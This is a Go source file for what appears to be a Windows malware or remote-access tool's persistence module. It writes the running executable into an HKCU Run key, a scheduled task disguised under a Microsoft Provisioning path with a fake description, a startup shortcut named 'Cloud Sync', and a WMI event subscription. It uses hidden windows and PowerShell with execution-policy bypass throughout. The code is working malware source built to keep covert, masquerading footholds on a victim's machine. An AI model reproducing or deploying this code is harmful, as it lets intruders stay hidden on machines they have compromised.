package handlers

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

type PersistenceManager struct {
	methods []PersistenceMethod
}

type PersistenceMethod interface {
	Name() string
	Apply(execPath string) error
	Remove() error
}

func NewPersistenceManager() *PersistenceManager {
	return &PersistenceManager{
		methods: []PersistenceMethod{
			&RegistryMethod{
				KeyName: "Component Update",
			},
			&TaskMethod{
				TaskName:    "Microsoft\\Windows\\Management\\Provisioning\\Logon",
				Description: "Maintains and improves compatibility of Windows applications.",
			},
			&StartupShortcutMethod{
				ShortcutName: "Cloud Sync.url",
			},
			&WMIMethod{
				FilterName:   "SysUpdaterFilter",
				ConsumerName: "SysUpdaterConsumer",
				BindingName:  "SysUpdaterBinding",
			},
		},
	}
}

func (pm *PersistenceManager) EnsureAll() string {
	// just get current exe path, no install bs
	currentPath, err := os.Executable()
	if err != nil {
		return fmt.Sprintf("failed to get exe path: %v", err)
	}

	var results []string
	var establishedCount int

	for _, method := range pm.methods {
		if err := method.Apply(currentPath); err == nil {
			results = append(results, fmt.Sprintf("  ✅ %s", method.Name()))
			establishedCount++
		} else {
			results = append(results, fmt.Sprintf("  ❌ %s (%v)", method.Name(), err))
		}
	}

	if establishedCount == 0 {
		return "⚠️ all persistence methods failed.**"
	}

	return fmt.Sprintf("**persistence Established (%d/%d methods)**\n```\n%s\n```\n**Running from:** `%s`",
		establishedCount, len(pm.methods), strings.Join(results, "\n"), currentPath)
}

func (pm *PersistenceManager) RemoveAll() {
	for _, method := range pm.methods {
		method.Remove()
	}
}

// registry hkcu run method
type RegistryMethod struct {
	KeyName string
}

func (r *RegistryMethod) Name() string { return "Registry (HKCU Run)" }
func (r *RegistryMethod) Apply(execPath string) error {
	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer key.Close()
	return key.SetStringValue(r.KeyName, execPath)
}
func (r *RegistryMethod) Remove() error {
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
	if err != nil {
		if err == registry.ErrNotExist {
			return nil
		}
		return err
	}
	defer key.Close()
	return key.DeleteValue(r.KeyName)
}

// scheduled task
type TaskMethod struct {
	TaskName    string
	Description string
}

func (t *TaskMethod) Name() string { return "Scheduled Task" }
func (t *TaskMethod) Apply(execPath string) error {
	cmd := exec.Command("schtasks", "/Create", "/TN", t.TaskName, "/TR", fmt.Sprintf(`"%s"`, execPath), "/SC", "ONLOGON", "/RL", "HIGHEST", "/F", "/D", t.Description)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run()
}
func (t *TaskMethod) Remove() error {
	cmd := exec.Command("schtasks", "/Delete", "/TN", t.TaskName, "/F")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run()
}

// startup shortcut (kinda mid but w/e)
type StartupShortcutMethod struct {
	ShortcutName string
}

func (s *StartupShortcutMethod) Name() string { return "Startup Shortcut" }
func (s *StartupShortcutMethod) Apply(execPath string) error {
	startupDir, err := windows.KnownFolderPath(windows.FOLDERID_Startup, 0)
	if err != nil {
		return err
	}
	shortcutPath := filepath.Join(startupDir, s.ShortcutName)
	content := fmt.Sprintf("[InternetShortcut]\nURL=file:///%s", strings.ReplaceAll(execPath, `\`, `/`))
	return os.WriteFile(shortcutPath, []byte(content), 0644)
}
func (s *StartupShortcutMethod) Remove() error {
	startupDir, err := windows.KnownFolderPath(windows.FOLDERID_Startup, 0)
	if err != nil {
		return err
	}
	return os.Remove(filepath.Join(startupDir, s.ShortcutName))
}

// wmi event subscription
type WMIMethod struct {
	FilterName   string
	ConsumerName string
	BindingName  string
}

func (w *WMIMethod) Name() string { return "WMI Event Subscription" }
func (w *WMIMethod) Apply(execPath string) error {
	filterQuery := `SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300`
	psFilter := fmt.Sprintf(`$filter = ([wmiclass]'root\subscription:__EventFilter').CreateInstance(); $filter.Name = '%s'; $filter.Query = "%s"; $filter.QueryLanguage = 'WQL'; $filter.EventNamespace = 'root\cimv2'; $filter.Put()`, w.FilterName, filterQuery)
	psConsumer := fmt.Sprintf(`$consumer = ([wmiclass]'root\subscription:CommandLineEventConsumer').CreateInstance(); $consumer.Name = '%s'; $consumer.CommandLineTemplate = '%s'; $consumer.Put()`, w.ConsumerName, execPath)
	psBinding := fmt.Sprintf(`$binding = ([wmiclass]'root\subscription:__FilterToConsumerBinding').CreateInstance(); $binding.Filter = $filter; $binding.Consumer = $consumer; $binding.Put()`)
	fullCommand := fmt.Sprintf("%s; %s; %s", psFilter, psConsumer, psBinding)
	cmd := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", fullCommand)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run()
}

func (w *WMIMethod) Remove() error {
	psRemove := fmt.Sprintf(`
        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -match '%s' } | Remove-WmiObject;
        Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object { $_.Name -eq '%s' } | Remove-WmiObject;
        Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object { $_.Name -eq '%s' } | Remove-WmiObject;
    `, w.FilterName, w.ConsumerName, w.FilterName)
	cmd := exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", psRemove)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run()
}

